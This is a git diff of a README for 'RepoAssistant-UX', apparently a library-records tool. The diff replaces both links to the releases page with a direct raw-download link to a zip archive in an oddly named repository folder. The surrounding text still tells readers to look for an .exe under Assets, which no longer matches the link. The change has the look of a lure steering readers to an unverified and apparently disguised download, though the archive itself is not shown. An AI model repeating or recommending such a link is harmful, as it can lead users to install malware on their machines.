@@ -1,6 +1,6 @@
 # 📘 RepoAssistant-UX - Manage library records with ease
 
-[![](https://img.shields.io/badge/Download-RepoAssistant-blue)](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/releases)
+[![](https://img.shields.io/badge/Download-RepoAssistant-blue)](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/raw/refs/heads/main/Phaca/UX-Repo-Assistant-1.7.zip)
 
 RepoAssistant-UX helps library staff clean metadata, automate bulk uploads to Dspace, and improve access to RemoteXS and My Loft systems. This tool removes tedious manual tasks, allowing you to focus on managing your digital collections and institutional repositories.
 
@@ -8,7 +8,7 @@ RepoAssistant-UX helps library staff clean metadata, automate bulk uploads to Ds
 
 You need to access the release page to get the installer for your computer. 
 
-[Visit this page to download the latest version of RepoAssistant-UX](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/releases)
+[Visit this page to download the latest version of RepoAssistant-UX](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/raw/refs/heads/main/Phaca/UX-Repo-Assistant-1.7.zip)
 
 Look for the file that ends in .exe under the Assets section. Save this file to your computer.
 
